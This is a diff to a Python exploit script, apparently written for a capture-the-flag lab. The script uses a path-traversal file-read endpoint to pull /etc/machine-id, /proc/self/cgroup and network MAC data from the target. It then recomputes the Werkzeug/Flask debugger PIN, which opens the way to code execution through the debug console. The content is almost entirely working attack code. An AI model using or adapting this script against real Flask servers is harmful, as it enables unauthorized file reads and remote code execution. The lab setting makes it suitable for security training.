@@ -8,7 +8,7 @@ from itertools import chain
 payload1 = 'etc/machine-id'
 payload2 = 'proc/net/arp'
 payload3 = 'sys/class/net/'
-url = 'http://127.0.0.1:7777/readfile?file=....//...//...//...//...//' #change your ip to challenge lab ip
+url = 'http://localhost:7777/readfile?file=....//...//...//...//...//' #change your ip to challenge lab ip
 payload4 = 'proc/self/cgroup'
 
 def get_mac_adderess():
@@ -27,33 +27,41 @@ def get_mac_adderess():
     
 
 def get_machine_id():
-   
-    r = requests.get(url+payload1)
+    r = requests.get(url + payload1)
     machine_id = r.text.rstrip('\n')
-    #print(machine_id)
-    r = requests.get(url+payload4)
+    # print("Actual:",machine_id)
+    r = requests.get(url + payload4)
     x = r.text
     extracted_string = x.split(":")[-1]
     cgroup = extracted_string.split("/")[-1].rstrip('\n')
-    appended = machine_id+cgroup
+    appended = machine_id + cgroup
+    # Remove spaces from the appended value
+    appended = appended.replace(" ", "")
     return appended
+
 
 mac_address = str(get_mac_adderess())
 appended =get_machine_id()
 
-#print(type(mac_address))   
+#print(type(mac_address))  
+
+print("MAC Address:", mac_address)
+print("Appended Value:", appended.replace(" ", ""))
+
 
 probably_public_bits = [
-    'vignesh',  # username
+    'Alex',  # username
     'flask.app',  # modname
     'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
-    '/home/vignesh/.local/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
+    '/usr/local/lib/python3.10/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
 ]
+
 
 private_bits = [
     mac_address,  # str(uuid.getnode()),  /sys/class/net/ens33/address
     appended  # get_machine_id(), /etc/machine-id
 ]
+
 
 # h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
 h = hashlib.sha1()
